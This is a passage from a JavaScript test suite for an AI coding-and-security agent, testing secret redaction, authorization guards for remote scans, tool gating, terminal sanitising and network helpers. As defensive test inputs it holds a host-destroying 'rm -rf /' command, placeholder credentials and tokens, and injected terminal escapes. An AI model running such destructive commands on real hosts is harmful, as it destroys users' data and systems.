  const eq = redactCommandSecrets("deploy --token=abcd1234secret --region us-east");
  ok("--token=VALUE redacted", !/abcd1234secret/.test(eq) && /--token=\[redacted:credential\]/.test(eq));
  const nextarg = redactCommandSecrets("tool --password s3cr3tValue --verbose");
  ok("--password VALUE (next token) redacted", !/s3cr3tValue/.test(nextarg) && /--password \[redacted:credential\]/.test(nextarg));
  const basic = redactCommandSecrets("curl -u alice:topsecret https://test.darknode.ai");
  ok("curl -u user:pass redacts only the password", !/topsecret/.test(basic) && /-u alice:\[redacted:password\]/.test(basic));
  ok("token-shaped secret anywhere still masked", /\[redacted:aws-key\]/.test(redactCommandSecrets("echo AKIAIOSFODNN7EXAMPLE")));
  ok("a clean command is unchanged", redactCommandSecrets("npm test && git status") === "npm test && git status");
  ok("a flag that merely starts with -p is not over-redacted", redactCommandSecrets("cp -pr src dst") === "cp -pr src dst");
  // redactArgv: the catalog-driven primitive for callers that already hold argv.
  const ra = redactArgv(["mysql", "-pHunter2", "-h", "db"]);
  ok("redactArgv redacts attached mysql password", ra.argv[1] === "-p[redacted:password]" && ra.redactions === 1);
  const rv = redactArgv(["deploy", "--token", "abc123", "--region=us"]);
  ok("redactArgv redacts --token next-arg", rv.argv[2] === "[redacted:credential]" && rv.redactions === 1);
  const rvq = redactArgv(["svc", "--api-key=xyz789"]);
  ok("redactArgv redacts --api-key=VALUE", rvq.argv[1] === "--api-key=[redacted:credential]");
  const ru = redactArgv(["curl", "-u", "bob:pw", "https://test.darknode.ai"]);
  ok("redactArgv redacts curl -u password only", ru.argv[2] === "bob:[redacted:password]");
  ok("redactArgv leaves a clean argv alone", redactArgv(["git", "status"]).redactions === 0);
  ok("CRED_FLAGS is frozen", (() => { try { require("../lib/governance/security").CRED_FLAGS.push({}); return false; } catch (_) { return true; } })());
}

group("NX-007: redaction is complete across every channel");
{
  // The redaction invariant that makes every output channel (logs, transcripts,
  // error output, cloud prompts) safe: anything scanSecrets can detect,
  // maskSecrets fully removes — the raw secret value never survives, and nothing
  // detectable remains. Logs/transcripts/prompts are safe precisely because they
  // all pass through this one chokepoint.
  const secrets = {
    "aws": "AKIAIOSFODNN7EXAMPLE",
    "github": "ghp_" + "b".repeat(36),
    "slack": "xoxb-123456789012-abcdefghijkl",
    "openai": "sk-" + "c".repeat(32),
    "google": "AIza" + "d".repeat(35),
    "jwt": "eyJ" + "a".repeat(10) + "." + "b".repeat(10) + "." + "c".repeat(8),
    "privkey": "-----BEGIN RSA PRIVATE KEY-----\nMIIabcDEFghi\n-----END RSA PRIVATE KEY-----",
    "hardcoded": 'password: "hunter2secret"',
  };
  for (const [kind, raw] of Object.entries(secrets)) {
    const wrapped = "log line before " + raw + " and after";
    ok("scanSecrets detects " + kind, scanSecrets(raw).length > 0);
    const masked = maskSecrets(wrapped);
    ok("maskSecrets removes the raw " + kind + " value", masked.indexOf(raw) === -1);
    ok("no detectable " + kind + " residue after masking", scanSecrets(masked).length === 0);
    ok("surrounding context is preserved for " + kind, /log line before/.test(masked) && /and after/.test(masked));
  }
  // The completeness guarantee stated as one property over a mixed blob.
  const blob = Object.values(secrets).join(" | ");
  ok("a blob of every secret type masks to nothing detectable", scanSecrets(maskSecrets(blob)).length === 0);
}

group("NX-011: published command reference is generated, not hand-kept");
{
  const fs = require("fs");
  const gen = require("../scripts/export-command-ref");
  const fresh = gen.serialize();
  let onDisk = null; try { onDisk = fs.readFileSync(gen.OUT, "utf8"); } catch (_) {}
  ok("command-ref.json exists (run: node scripts/export-command-ref.js)", onDisk !== null);
  ok("command-ref.json is up to date vs lib/cli/reference.js (stale => CI fails)", onDisk === fresh);
  const built = gen.build();
  ok("every documented command has a usage + description", built.groups.every((g) => g.commands.every((c) => c.usage && c.desc)));
  ok("commandCount matches the rows", built.commandCount === built.groups.reduce((n, g) => n + g.commands.length, 0));
}

group("NX-002 default posture: active commands need local target or authorization");
{
  const DG = require("../lib/governance/default-guard");
  for (const t of ["127.0.0.1", "localhost", "10.1.2.3", "192.168.0.5", "172.16.9.9", "172.31.0.1", "::1", "app.internal", "box.local", "target.test", "169.254.1.1", "100.64.0.1"])
    ok("local/private allowed: " + t, DG.guardActive("scan", t, {}).allow);
  for (const t of ["1.2.3.4", "scanme.nmap.org", "8.8.8.8", "https://example.com/x", "target.com:8443", "172.32.0.1", "2001:4860:4860::8888"])
    ok("remote refused without auth: " + t, !DG.guardActive("scan", t, {}).allow);
  ok("remote allowed with --authorized", DG.guardActive("nmap", "1.2.3.4", { authorized: true }).allow);
  ok("passive dns is never guarded here", DG.guardActive("dns", "8.8.8.8", {}).allow);
  ok("passive whois is never guarded here", DG.guardActive("whois", "example.com", {}).allow);
  eq("hostOf strips scheme/userinfo/port/path", DG.hostOf("https://user@Example.com:8443/a/b?x"), "example.com");
  ok("IPv6 loopback is local", DG.isLocalTarget("::1"));
  ok("public IPv6 is remote", !DG.isLocalTarget("2001:4860:4860::8888"));
  ok("a public DNS resolver is remote, not local", !DG.isLocalTarget("8.8.8.8"));
  // subrecon is an ACTIVE verb (engagement-gate classifies it cls:"scan"): it
  // brute-forces subdomains against the target, so it must obey the same gate.
  ok("subrecon is in the ACTIVE set", DG.ACTIVE.has("subrecon"));
  ok("subrecon against a remote target is refused without auth", !DG.guardActive("subrecon", "target.com", {}).allow);
  ok("subrecon against a remote target is allowed with --authorized", DG.guardActive("subrecon", "target.com", { authorized: true }).allow);
  ok("subrecon against a local target is allowed", DG.guardActive("subrecon", "127.0.0.1", {}).allow);
}

group("NX dispatch gates: every shell-running tool is screened, not just run_command");
{
  const { EXEC_TOOLS, PLAN_BLOCKED, isExecTool, isPlanBlocked } = require("../lib/nexus/tool-gates");
  // Finding 1: exec tools reach a shell via coderShell/runTest, so the danger
  // guard, the policy and HARD_DENY must treat them like run_command.
  for (const t of ["run_command", "run_background", "verify", "run_tests", "test_project", "bisect", "shrink", "explain_break", "lint_format"])
    ok("exec tool screened by the danger/policy gate: " + t, isExecTool(t));
  for (const t of ["read_file", "list_dir", "search", "find", "repo_map", "find_symbol"])
    ok("read-only tool is NOT treated as exec: " + t, !isExecTool(t));
  // A destructive command routed through verify must now hit HARD_DENY, exactly
  // as run_command would — proving the act-mapping change closes the bypass.
  ok("verify maps to a run action (exec gate)", isExecTool("verify"));
  eq("HARD_DENY catches a host-destroying command regardless of which exec tool carried it",
    policyCheck(POLICY_DEFAULTS, { type: "run", command: "rm -rf /" }).allow, false);
  ok("an exec tool with no command is harmless (auto-detected verify)",
    policyCheck(POLICY_DEFAULTS, { type: "run", command: undefined }).allow === true);
  // Finding 2: plan mode (read-only) must block everything mutating, executing
  // or egressing — by membership, so a tool merely absent from a list isn't run.
  for (const t of ["write_file", "edit_file", "run_command", "verify", "bisect", "shrink", "http_fetch", "web_fetch", "web_search", "browser_eval", "spawn_agents", "notebook_edit", "remember", "todo_write", "mcp__srv__do"])
    ok("plan mode blocks: " + t, isPlanBlocked(t));
  for (const t of ["read_file", "list_dir", "search", "find", "repo_map", "find_symbol", "discover"])
    ok("plan mode allows the read-only tool: " + t, !isPlanBlocked(t));
  ok("every exec tool is also plan-blocked", [...EXEC_TOOLS].every((t) => PLAN_BLOCKED.has(t)));
  ok("isPlanBlocked tolerates a non-string name", !isPlanBlocked(undefined) && !isPlanBlocked(null));
}

group("NX-008: eval harness scoring + task admissibility");
{
  const { scoreRun, aggregate } = require("../eval/score");
  const h = require("../eval/harness");
  const p = require("path");
  ok("command exit 0 => pass", scoreRun({ type: "command" }, { code: 0 }).pass);
  ok("command exit 1 => fail", !scoreRun({ type: "command" }, { code: 1 }).pass);
  const perfect = scoreRun({ type: "finding", groundTruth: ["a:1", "b:2"] }, { findings: ["a:1", "b:2"] });
  ok("finding perfect => pass, 0 FP, P=R=1", perfect.pass && perfect.fp === 0 && perfect.precision === 1 && perfect.recall === 1);
  const fp = scoreRun({ type: "finding", groundTruth: ["a:1"] }, { findings: ["a:1", "c:3"] });
  ok("a false positive drops precision and fails the task", !fp.pass && fp.fp === 1 && fp.precision === 0.5);
  const fn = scoreRun({ type: "finding", groundTruth: ["a:1", "b:2"] }, { findings: ["a:1"] });
  ok("a miss drops recall", !fn.pass && fn.fn === 1 && fn.recall === 0.5);
  const agg = aggregate([
    { score: { pass: true }, metrics: { latencyMs: 100, tokens: 10, costUsd: 0.01 } },
    { score: { pass: false }, metrics: { latencyMs: 300, tokens: 30, costUsd: 0.03 } },
  ]);
  ok("pass-rate is a fraction, not rounded to works/doesn't", agg.passRate === 0.5);
  ok("variance is reported, not only the mean", agg.latencyMs.mean === 200 && agg.latencyMs.variance > 0);
  ok("task without provenance is excluded", !h.admissible({ id: "x", axis: "a", type: "command", prompt: "p", verify: "true", contamination: "c" }));
  ok("task without contamination argument is excluded", !h.admissible({ id: "x", axis: "a", type: "command", prompt: "p", verify: "true", provenance: "p" }));
  ok("a complete command task is admissible", h.admissible({ id: "x", axis: "a", type: "command", prompt: "p", verify: "true", provenance: "p", contamination: "c" }));
  const tasks = h.loadTasks(p.join(__dirname, "..", "eval", "tasks"));
  ok("the shipped dev tasks all parse", tasks.length >= 3);
  ok("every shipped dev task is admissible", tasks.every(h.admissible));
}

group("NX-005 C3: findings are re-confirmed against evidence (false-positive gate)");
{
  const { validateFindings, parseFindingLines, normKind } = require("../lib/nexus/finding-validate");
  // Deterministic sandbox: the file content is injected, so no real I/O.
  const AWS = "AKIA" + "IOSFODNN7EXAMPLE"; // split so this test string is not itself a committed secret
  const files = {
    "config.js": "const key = '" + AWS + "';",
    "clean.js": "const port = 8080; // nothing secret here",
  };
  const read = (p) => (Object.prototype.hasOwnProperty.call(files, p) ? files[p] : null);

  const r1 = validateFindings([{ kind: "aws", path: "config.js" }], read);
  ok("a finding that reproduces at its path is kept", r1.validated.length === 1 && r1.validated[0].kind === "aws-key" && r1.validated[0].reproduced === true);
  ok("a kept finding carries its canonical kind, not the raw label", r1.validated[0].kind === "aws-key" && r1.dropped.length === 0);

  const r2 = validateFindings([{ kind: "aws-key", path: "clean.js" }], read);
  ok("a finding whose secret is NOT at the cited path is dropped as non-reproducing", r2.validated.length === 0 && r2.dropped.length === 1 && /does not reproduce/.test(r2.dropped[0].reason));

  const r3 = validateFindings([{ kind: "aws-key", path: "ghost.js" }], read);
  ok("a finding at a path that does not exist is dropped (does not reproduce)", r3.validated.length === 0 && /path not found/.test(r3.dropped[0].reason));

  const r4 = validateFindings([{ kind: "aws", path: "config.js" }, { kind: "aws-key", path: "config.js" }], read);
  ok("synonyms collapse so the same finding is not reported twice", r4.validated.length === 1 && r4.dropped.length === 1 && r4.dropped[0].reason === "duplicate");

  const r5 = validateFindings([{ kind: "", path: "config.js" }, { kind: "aws", path: "" }], read);
  ok("a finding missing a kind or a path is dropped, never silently kept", r5.validated.length === 0 && r5.dropped.length === 2 && r5.dropped.every((d) => /missing/.test(d.reason)));

  ok("kind normalisation folds scanner labels and agent synonyms onto one canonical kind", normKind("AWS access key id") === "aws-key" && normKind("GitHub token") === "github-token" && normKind("gh-token") === "github-token");
  ok("an unknown kind is passed through lower-cased, not dropped by normalisation", normKind("Custom-Rule-42") === "custom-rule-42");

  const parsed = parseFindingLines("aws:config.js\n  github-token: src/app.js  \nnot a finding line\n");
  ok("agent 'kind:path' output lines parse; prose lines are ignored", parsed.length === 2 && parsed[0].kind === "aws" && parsed[1].path === "src/app.js");

  // The whole point: a mixed batch of real + bogus findings yields only the reproduced ones.
  const mixed = validateFindings(parseFindingLines("aws:config.js\napi-key:clean.js\naws:ghost.js"), read);
  ok("mixed batch: only the reproducing finding survives; the rest are dropped with reasons", mixed.validated.length === 1 && mixed.dropped.length === 2);
}

group("output styles (Claude-Code idea)");
{
  ok("default → empty directive", styleDirective("default") === "");
  ok("unknown → empty directive", styleDirective("nope") === "");
  ok("concise has a directive", styleDirective("concise").length > 0);
  ok("names include review/tdd/secure", ["review", "tdd", "secure"].every((n) => styleNames().includes(n)));
}

group("agent memory / remember — dedup");
{
  let r = mergeMemory("# Nexus\n", "Use the shared Table component at src/Table.tsx");
  ok("adds a new fact", r.added === true && /## Remembered/.test(r.md) && /Table component/.test(r.md));
  const r2 = mergeMemory(r.md, "use the shared table component at src/Table.tsx");
  ok("dedups (case/punct-insensitive)", r2.added === false);
  const r3 = mergeMemory(r.md, "Use the shared Table component");
  ok("dedups a substring", r3.added === false);
  ok("rejects too-short", mergeMemory("", "ok").added === false);
  const r4 = mergeMemory(r.md, "Always run npm test before pushing");
  ok("adds a distinct fact", r4.added === true && /npm test/.test(r4.md));
}

group("custom output styles (.nexus/styles/*.md)");
{
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "styles-"));
  fs.writeFileSync(path.join(dir, "pirate.md"), "# Pirate\nRespond in the voice of a pirate, but keep the code correct.");
  fs.writeFileSync(path.join(dir, "concise.md"), "Override: one sentence max."); // custom overrides built-in
  const loaded = loadStyles(dir);
  ok("loads custom style from md", loaded.pirate.startsWith("Respond in the voice"));
  ok("strips the leading heading", !loaded.pirate.startsWith("#"));
  const all = allStyles(dir);
  ok("merges built-ins + custom", all.review === STYLES.review && all.pirate);
  ok("custom overrides built-in", all.concise === "Override: one sentence max.");
  ok("missing dir → just built-ins", Object.keys(allStyles(path.join(dir, "nope"))).length === Object.keys(STYLES).length);
  fs.writeFileSync(path.join(dir, "constructor.md"), "should be ignored");
  const loaded2 = loadStyles(dir);
  ok("a style file named 'constructor' is skipped and the map is null-proto", !Object.prototype.hasOwnProperty.call(loaded2, "constructor") && Object.getPrototypeOf(loaded2) === null);
  fs.rmSync(dir, { recursive: true, force: true });
}

group("discover tool");
{
  const r = discoverTools("search files", TOOL_CATALOG).map((t) => t.name);
  ok("query matches search + find", r.includes("search") && r.includes("find"));
  ok("query 'http' finds http_fetch", discoverTools("http", TOOL_CATALOG).some((t) => t.name === "http_fetch"));
  ok("empty query → all tools", discoverTools("", TOOL_CATALOG).length === TOOL_CATALOG.length);
  ok("no match → empty", discoverTools("zzzznomatch", TOOL_CATALOG).length === 0);
}

group("background jobs (Claude-Code idea) — state machine");
{
  const bg = createBgJobs();
  const id = bg.start("npm run dev", { kill() { this.killed = true; } }, 1000);
  ok("starts running", bg.get(id).status === "running" && bg.running() === 1);
  bg.append(id, "listening on :3000\n"); bg.append(id, "compiled\n");
  ok("buffers output", bg.tail(id).includes("listening on :3000") && bg.tail(id).includes("compiled"));
  ok("list shape", bg.list()[0].id === id && bg.list()[0].status === "running" && bg.list()[0].bytes > 0);
  bg.finish(id, 0);
  ok("finish -> done, running=0", bg.get(id).status === "done" && bg.get(id).code === 0 && bg.running() === 0);
  ok("finish is idempotent", (bg.finish(id, 7), bg.get(id).code === 0)); // already done, code unchanged
  const bg2 = createBgJobs(); const child = { killed: false, kill() { this.killed = true; } };
  const id2 = bg2.start("sleep 999", child, 0); bg2.killAll();
  ok("killAll kills running + marks killed", child.killed === true && bg2.get(id2).status === "killed");
  const bg3 = createBgJobs(); const id3 = bg3.start("x", null, 0); bg3.append(id3, "y".repeat(MAX_BUF + 5000));
  ok("output buffer is bounded", bg3.get(id3).out.length <= MAX_BUF);
  const bg4 = createBgJobs(); const kc = { kill() { this.k = true; } }; const id4 = bg4.start("srv", kc, 0);
  ok("stop() kills a specific job", bg4.stop(id4) === true && kc.k === true && bg4.get(id4).status === "killed");
  ok("stop() unknown id → false", bg4.stop("nope") === false);
}

group("settings schema (data-driven /settings panel)");
{
  const v = { engine: "claude", model: "opus", effort: "high", fallback: "", style: "review", lean: true, cowork: { on: true, strong: "opus", weak: "haiku" }, costCap: 5, cost: 0.1234, mode: "plan", guard: "enforce", policyOrg: true, audit: true, redact: true, offline: false, notify: true, ctxPct: 42, pins: 2, bgRunning: 1 };
  const d = describe(v);
  ok("groups present", d.map((g) => g.group).join(",") === "Model,Output,Cost,Safety & policy,Privacy,Session");
  const flat = {}; d.forEach((g) => g.rows.forEach((r) => (flat[r.label] = r.value)));
  ok("engine value", flat["Engine"] === "claude");
  ok("style value", flat["Output style"] === "review");
  ok("lean on", flat["Lean output"] === "on");
  ok("cowork rendered", flat["Cowork (strong+weak)"] === "opus -> haiku");
  ok("budget rendered", flat["Budget cap"] === "$5.00");
  ok("policy org-enforced", flat["Security policy"] === "org-enforced");
  ok("every row has a cmd", d.every((g) => g.rows.every((r) => r.cmd && r.cmd.length)));
}

group("ollama coder-model selection");
{
  ok("prefers qwen2.5-coder", pickCoderModel(["llama3.2:3b", "qwen2.5-coder:7b", "mistral"]) === "qwen2.5-coder:7b");
  ok("priority order (deepseek over codellama)", pickCoderModel(["codellama:7b", "deepseek-coder:6.7b"]) === "deepseek-coder:6.7b");
  ok("falls back to code-ish", pickCoderModel(["mystery-code-model", "random"]) === "mystery-code-model");
  ok("falls back to first", pickCoderModel(["random1", "random2"]) === "random1");
  ok("empty → empty string", pickCoderModel([]) === "");
}

group("config validation (.nexus/policy.json + team.json)");
{
  ok("valid policy → no warnings", validatePolicy({ protectedPaths: ["*.env"], blockSecrets: true, maxFilesPerTurn: 5 }).length === 0);
  ok("protectedPaths wrong type", validatePolicy({ protectedPaths: "nope" })[0].includes("must be an array"));
  ok("blockSecrets wrong type", validatePolicy({ blockSecrets: "yes" })[0].includes("true or false"));
  ok("negative maxFilesPerTurn", validatePolicy({ maxFilesPerTurn: -1 }).some((s) => />= 0/.test(s)));
  ok("invalid denied-command regex", validatePolicy({ deniedCommands: ["("] }).some((s) => /invalid regex/.test(s)));
  ok("non-object policy", validatePolicy(42)[0].includes("must be a JSON object"));
  ok("valid team → no warnings", validateTeam({ roles: [{ role: "builder", engine: "claude" }], maxRounds: 2 }, ["claude", "ollama"]).length === 0);
  ok("team role missing engine", validateTeam({ roles: [{ role: "builder" }] }).some((s) => /missing 'engine'/.test(s)));
  ok("team unknown engine", validateTeam({ roles: [{ role: "x", engine: "gpt9" }] }, ["claude"]).some((s) => /unknown engine/.test(s)));
  ok("team bad maxRounds", validateTeam({ maxRounds: 0 }).some((s) => />= 1/.test(s)));
}

group("edge cases");
{
  // mergeMemory: appends under an existing section rather than duplicating the header
  const r = mergeMemory("# P\n\n## Remembered\n- Existing rule\n", "A brand new rule");
  ok("remember reuses existing section", (r.md.match(/## Remembered/g) || []).length === 1 && /A brand new rule/.test(r.md));
  // maskSecrets: multiple secrets in one blob
  const masked = maskSecrets("aws AKIA" + "ABCDEFGHIJKLMNOP" + " gh ghp_" + "z".repeat(36) + " goog AIza" + "y".repeat(35));
  ok("masks several secret types at once", masked.includes("[redacted:aws-key]") && masked.includes("[redacted:github-token]") && masked.includes("[redacted:google-key]"));
  // globToRe: leading-dot files and single-char wildcard
  ok("globToRe .env.* matches .env.prod", globToRe(".env.*").test(".env.prod"));
  ok("globToRe ? single char", globToRe("id_rsa?").test("id_rsa1") && !globToRe("id_rsa?").test("id_rsaXY"));
  // priceOf: case-insensitive
  ok("priceOf OPUS (caps)", priceOf("OPUS").out === 20);
  // describe: tolerates a sparse/empty state without throwing
  ok("settings describe empty state", describe({}).length === 6 && describe({}).every((g) => g.rows.length > 0));
  // codexParse: multiple agent messages -> last wins
  ok("codex takes the latest message", codexParse([JSON.stringify({ type: "item.completed", item: { type: "agent_message", text: "first" } }), JSON.stringify({ type: "item.completed", item: { type: "agent_message", text: "final answer" } })].join("\n")).text === "final answer");
  // discoverTools: case-insensitive keyword
  ok("discover is case-insensitive", discoverTools("HTTP", TOOL_CATALOG).some((t) => t.name === "http_fetch"));
}

group("text helpers");
{
  ok("oneline collapses whitespace", oneline("a\n  b\t c") === "a b c");
  ok("oneline truncates with ellipsis", oneline("abcdefghij", 5) === "abcd…" && oneline("abcdefghij", 5).length === 5);
  ok("oneline short passes through", oneline("hi", 10) === "hi");
  ok("extractJson from noisy text (obj)", extractJson("blah {\"a\":1} tail").a === 1);
  ok("extractJson array", Array.isArray(extractJson("x [1,2,3] y")) && extractJson("x [1,2,3] y")[2] === 3);
  ok("extractJson fallback on garbage", extractJson("no json here", "FB") === "FB");
  // a verdict object whose reason contains "[...]" must not be mis-read as an array
  ok("extractJson object with bracketed reason stays an object", extractJson('{"done":false,"reason":"fails at [2]"}', null).done === false);
  ok("extractJson prefers the container that opens first (prose + brackets)", extractJson('Sure: {"done":false,"reason":"see [line 5]"}', null).done === false);
}

group("render helpers (frameDiff + wordHi) — the trickiest pure algorithms");
{
  const E = "\x1b";
  ok("frameDiff full redraw starts [H ends [J", frameDiff(null, ["a", "b", "c"], E).startsWith(E + "[H") && frameDiff(null, ["a"], E).endsWith(E + "[J"));
  ok("frameDiff rewrites only the changed row", frameDiff(["a", "b", "c"], ["a", "X", "c"], E) === E + "[2;1HX" + E + "[K");
  ok("frameDiff identical → empty", frameDiff(["a", "b"], ["a", "b"], E) === "");
  ok("frameDiff taller frame appends only the new row (no full redraw)", frameDiff(["a"], ["a", "b"], E) === E + "[2;1Hb" + E + "[K");
  ok("frameDiff shorter frame clears the stale rows below", frameDiff(["a", "b", "c"], ["a", "b"], E) === E + "[3;1H" + E + "[J");
  ok("frameDiff two changes target rows 2 & 4", frameDiff(["a", "b", "c", "d"], ["a", "B", "c", "D"], E) === E + "[2;1HB" + E + "[K" + E + "[4;1HD" + E + "[K");
  // ansiWrap: plain parity with the old raw wrapper, plus color-safety
  const oldWrap = (text, width) => { width = Math.max(1, width); const res = []; let inCode = false; for (const para of String(text).replace(/\r/g, "").split("\n")) { if (/^```/.test(para.trim())) inCode = !inCode; let s = para; if (!s.length) { res.push(""); continue; } while (s.length > width) { let w = width; const cc = s.charCodeAt(w - 1); if (cc >= 0xD800 && cc <= 0xDBFF) w = Math.max(1, w - 1); if (!inCode) { let brk = s.lastIndexOf(" ", w); if (brk < width * 0.4) brk = -1; if (brk > 0) { res.push(s.slice(0, brk)); s = s.slice(brk + 1); continue; } } res.push(s.slice(0, w)); s = s.slice(w); } res.push(s); } return res; };
  const prose = "The quick brown fox jumps over the lazy dog and then keeps running across the whole meadow without ever stopping.";
  let wrapParity = true; for (let w = 4; w <= 60; w += 3) if (JSON.stringify(ansiWrap(prose, w)) !== JSON.stringify(oldWrap(prose, w))) wrapParity = false;
  ok("ansiWrap matches the plain wrapper on prose at every width", wrapParity);
  ok("sanitizeTerm keeps SGR colour", sanitizeTerm("a\x1b[31mb\x1b[0m") === "a\x1b[31mb\x1b[0m");
  ok("sanitizeTerm drops clears, cursor moves, OSC title/hyperlinks, C0/C1", sanitizeTerm("x\x1b[2J\x1b[5;1H\x1b]0;t\x07\x1b]8;;u\x1b\\y\r\b\x07\x9bz") === "xyz");
  ok("sanitizeTerm keepNl keeps newlines/tabs, otherwise flattens them", sanitizeTerm("a\nb\tc", true) === "a\nb\tc" && sanitizeTerm("a\nb\tc") === "a b  c");
  ok("ansiWrap neutralises injected escapes", JSON.stringify(ansiWrap("hi\x1b[2J there\x1b]0;t\x07", 40)) === JSON.stringify(["hi there"]));
  ok("ansiWrap preserves blank lines between paragraphs", JSON.stringify(ansiWrap("a\n\nb", 10)) === JSON.stringify(["a", "", "b"]));
  const CY = (s) => "\x1b[36m" + s + "\x1b[0m";
  const colored = "status is " + CY("connected now") + " and holding steady across the whole long session here";
  const cw = ansiWrap(colored, 20);
  ok("ansiWrap counts only visible width for colored text", cw.every((l) => visLen(l) <= 20));
  ok("ansiWrap never slices a color escape", cw.every((l) => !(/\x1b(?!\[[0-9;]*m)/.test(l) || /\x1b\[[0-9;]*$/.test(l))));
  ok("ansiWrap keeps the visible content intact", JSON.stringify(cw.map(stripAnsi)) === JSON.stringify(oldWrap(stripAnsi(colored), 20)));
  const longTok = ansiWrap(CY("/very/long/path/to/a/deeply/nested/file.js"), 16);
  ok("ansiWrap splits a long colored token within width", longTok.every((l) => visLen(l) <= 16) && longTok.map(stripAnsi).join("") === "/very/long/path/to/a/deeply/nested/file.js");
  ok("ansiWrap re-opens the carried color on the continuation line", longTok.length > 1 && longTok[1].startsWith("\x1b[36m"));
  ok("ansiWrap expands tabs so a line can't overflow the border", (() => { const r = ansiWrap("     1\tcode here", 40); return r.every((l) => !/\t/.test(l) && visLen(l) <= 40); })());
  // wordHi (force color on for deterministic testing)
  const [m1, p1] = wordHi("const total = 22;", "const total = 12;", true);
  ok("wordHi marks the changed token bold+underline", m1.includes("\x1b[1;4;31m22") && p1.includes("\x1b[1;4;32m12"));
  ok("wordHi dims carried tokens", m1.includes("\x1b[2;31mconst") && p1.includes("\x1b[2;32mtotal"));
  const strip = (s) => s.replace(/\x1b\[[0-9;]*m/g, "");
  ok("wordHi preserves the visible text", strip(m1) === "const total = 22;" && strip(p1) === "const total = 12;");
  ok("wordHi with color off returns plain", JSON.stringify(wordHi("a x", "a y", false)) === JSON.stringify(["a x", "a y"]));
  ok("diffTokens splits words/space/punct", JSON.stringify(diffTokens("a=1")) === JSON.stringify(["a", "=", "1"]));
}

group("security console core (scan/hash/cve)");
{
  ok("parsePorts top → TOP_PORTS contents", JSON.stringify(parsePorts("top")) === JSON.stringify(TOP_PORTS) && JSON.stringify(parsePorts("")) === JSON.stringify(TOP_PORTS));
  ok("parsePorts top returns a COPY (mutating it can't corrupt the constant)", (() => { const p = parsePorts("top"); p.push(99999); return TOP_PORTS[TOP_PORTS.length - 1] !== 99999; })());
  ok("parsePorts range 20-25", JSON.stringify(parsePorts("20-25")) === JSON.stringify([20, 21, 22, 23, 24, 25]));
  ok("parsePorts list 80,443,8080", JSON.stringify(parsePorts("80,443,8080")) === JSON.stringify([80, 443, 8080]));
  ok("parsePorts drops out-of-range", JSON.stringify(parsePorts("0,80,70000,-1,443")) === JSON.stringify([80, 443]));
  ok("parsePorts range clamps invalid low/high ends", JSON.stringify(parsePorts("0-3")) === JSON.stringify([1, 2, 3]));
  ok("parsePorts huge range can't hang — clamped to 65535", (() => { const p = parsePorts("65533-999999999999"); return p.length === 3 && p[p.length - 1] === 65535; })());
  ok("parseCve tolerates a CVE object with no descriptions / no cve", parseCve({ cve: { id: "CVE-X" } }).desc === "" && parseCve({}).id === undefined);
  ok("idHash MD5/NTLM (32 hex)", idHash("5f4dcc3b5aa765d61d8327deb882cf99").startsWith("MD5"));
  ok("idHash SHA-1 (40 hex)", idHash("a".repeat(40)).startsWith("SHA-1"));
  ok("idHash SHA-256 (64 hex)", idHash("a".repeat(64)).startsWith("SHA-256"));
  ok("idHash bcrypt", idHash("$2y$10$abcdefghijklmnopqrstuv") === "bcrypt");
  ok("idHash unknown", idHash("hello") === "unknown");
  const cve = parseCve({ cve: { id: "CVE-2021-44228", published: "2021-12-10T10:15:09.143", descriptions: [{ lang: "en", value: "Log4Shell RCE" }], metrics: { cvssMetricV31: [{ cvssData: { baseScore: 10, baseSeverity: "CRITICAL" } }] } } });
  ok("parseCve extracts id/desc/score/sev/date", cve.id === "CVE-2021-44228" && cve.desc === "Log4Shell RCE" && cve.score === 10 && cve.sev === "CRITICAL" && cve.published === "2021-12-10");
  // cidr subnet math (bit ops — off-by-one prone)
  const c24 = cidrCalc("192.168.1.0/24");
  ok("cidr /24 network+broadcast", c24.network === "192.168.1.0" && c24.broadcast === "192.168.1.255");
  ok("cidr /24 netmask + 254 hosts", c24.netmask === "255.255.255.0" && c24.hosts === 254);
  ok("cidr /24 usable range", c24.firstUsable === "192.168.1.1" && c24.lastUsable === "192.168.1.254");
  ok("cidr non-aligned ip snaps to network", cidrCalc("10.0.0.130/25").network === "10.0.0.128" && cidrCalc("10.0.0.130/25").broadcast === "10.0.0.255");
  ok("cidr /31 → 2 hosts (point-to-point)", cidrCalc("10.0.0.0/31").hosts === 2);
  ok("cidr /32 → 1 host", cidrCalc("10.0.0.5/32").hosts === 1 && cidrCalc("10.0.0.5/32").network === "10.0.0.5");
  ok("cidr /0 → whole space", cidrCalc("0.0.0.0/0").netmask === "0.0.0.0" && cidrCalc("0.0.0.0/0").broadcast === "255.255.255.255");
  ok("cidr invalid → null", cidrCalc("not-a-cidr") === null && cidrCalc("192.168.1.0/33") === null && cidrCalc("999.1.1.1/24") === null);
  // ip-in-cidr membership
  ok("ipToInt round values", ipToInt("0.0.0.0") === 0 && ipToInt("255.255.255.255") === 4294967295 && ipToInt("256.0.0.0") === null);
  ok("inCidr inside /24", inCidr("192.168.1.50", "192.168.1.0/24") === true);
  ok("inCidr outside /24", inCidr("192.168.2.1", "192.168.1.0/24") === false);
  ok("inCidr boundary /25", inCidr("10.0.0.130", "10.0.0.128/25") === true && inCidr("10.0.0.127", "10.0.0.128/25") === false);
  ok("inCidr /0 matches all", inCidr("8.8.8.8", "0.0.0.0/0") === true);
  ok("inCidr invalid → null", inCidr("bad", "192.168.1.0/24") === null && inCidr("1.2.3.4", "nope") === null);
}

group("autonomous loop controller (Nexus /loop)");
{
  ok("continues mid-loop", loopDecision(2, 6, "did some work").stop === false);
  ok("stops on GOAL-DONE token", loopDecision(2, 6, "all set. " + DONE_TOKEN).stop === true && loopDecision(2, 6, "x " + DONE_TOKEN).reason === "goal complete");
  ok("stops at the round cap", loopDecision(6, 6, "more to do").stop === true && /limit/.test(loopDecision(6, 6, "x").reason));
  ok("DONE detection is case-insensitive", loopDecision(1, 6, "done: goal-done").stop === true);
  ok("clampRounds default", clampRounds(undefined, 6) === 6 && clampRounds("abc", 6) === 6);
  ok("clampRounds bounds 1..20", clampRounds(0) === 1 && clampRounds(999) === 20 && clampRounds("3") === 3);
  ok("loopPrompt includes goal + round + done token", loopPrompt("ship the CSS", 2, 5, "").includes("ship the CSS") && loopPrompt("g", 2, 5, "").includes("2/5") && loopPrompt("g", 1, 5, "").includes(DONE_TOKEN));
  ok("loopPrompt threads the previous note", loopPrompt("g", 3, 5, "prev output").includes("prev output"));
}

group("IOC defang / refang tool");
{
  ok("defang neutralizes scheme + dots", defang("http://evil.com") === "hxxp[://]evil[.]com");
